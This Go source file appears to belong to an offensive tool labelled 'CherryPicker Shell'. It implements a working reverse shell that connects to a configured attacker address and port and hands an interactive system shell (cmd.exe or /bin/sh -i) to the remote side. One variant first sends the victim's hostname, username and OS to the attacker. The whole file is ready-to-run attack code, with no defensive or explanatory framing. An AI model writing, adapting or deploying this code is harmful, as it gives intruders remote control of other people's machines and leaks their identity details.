package main

import (
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"os/exec"
	"runtime"
)

// StartReverseShell initiates a reverse shell connection to the attack box
func StartReverseShell(cfg *Config) error {
	target := fmt.Sprintf("%s:%d", cfg.AttackIP, cfg.AttackPort)
	log.Printf("[*] Attempting reverse shell connection to %s\n", target)

	// Connect to attack box
	conn, err := net.Dial("tcp", target)
	if err != nil {
		return fmt.Errorf("failed to connect to %s: %w", target, err)
	}
	defer conn.Close()

	log.Printf("[+] Connected to %s\n", target)

	// Get appropriate shell based on OS
	shell, shellArgs := getShell()

	// Create command
	cmd := exec.Command(shell, shellArgs...)

	// Redirect stdin, stdout, stderr to the connection
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	// Start the shell
	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start shell: %w", err)
	}

	log.Printf("[+] Reverse shell spawned (PID: %d)\n", cmd.Process.Pid)

	// Wait for shell to complete
	if err := cmd.Wait(); err != nil {
		log.Printf("[*] Shell exited: %v\n", err)
	} else {
		log.Println("[*] Shell exited normally")
	}

	return nil
}

// getShell returns the appropriate shell and arguments based on OS
func getShell() (string, []string) {
	switch runtime.GOOS {
	case "windows":
		return "cmd.exe", []string{}
	case "linux", "darwin":
		// Try to get user's preferred shell, fallback to /bin/sh
		shell := os.Getenv("SHELL")
		if shell == "" {
			shell = "/bin/sh"
		}
		return shell, []string{"-i"}
	default:
		return "/bin/sh", []string{"-i"}
	}
}

// TestConnection tests if the attack box is reachable
func TestConnection(cfg *Config) error {
	target := fmt.Sprintf("%s:%d", cfg.AttackIP, cfg.AttackPort)
	conn, err := net.DialTimeout("tcp", target, 5)
	if err != nil {
		return fmt.Errorf("cannot reach %s: %w", target, err)
	}
	conn.Close()
	return nil
}

// SendBanner sends an identification banner to the attack box
func SendBanner(conn net.Conn) error {
	hostname, _ := os.Hostname()
	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME") // Windows
	}

	banner := fmt.Sprintf("\n[CherryPicker Shell]\nHost: %s\nUser: %s\nOS: %s/%s\n\n",
		hostname, username, runtime.GOOS, runtime.GOARCH)

	_, err := io.WriteString(conn, banner)
	return err
}

// StartReverseShellWithBanner starts a reverse shell with an identification banner
func StartReverseShellWithBanner(cfg *Config) error {
	target := fmt.Sprintf("%s:%d", cfg.AttackIP, cfg.AttackPort)
	log.Printf("[*] Attempting reverse shell connection to %s\n", target)

	conn, err := net.Dial("tcp", target)
	if err != nil {
		return fmt.Errorf("failed to connect to %s: %w", target, err)
	}
	defer conn.Close()

	log.Printf("[+] Connected to %s\n", target)

	// Send identification banner
	if err := SendBanner(conn); err != nil {
		log.Printf("[!] Failed to send banner: %v\n", err)
	}

	shell, shellArgs := getShell()
	cmd := exec.Command(shell, shellArgs...)
	cmd.Stdin = conn
	cmd.Stdout = conn
	cmd.Stderr = conn

	if err := cmd.Start(); err != nil {
		return fmt.Errorf("failed to start shell: %w", err)
	}

	log.Printf("[+] Reverse shell spawned (PID: %d)\n", cmd.Process.Pid)

	if err := cmd.Wait(); err != nil {
		log.Printf("[*] Shell exited: %v\n", err)
	} else {
		log.Println("[*] Shell exited normally")
	}

	return nil
}
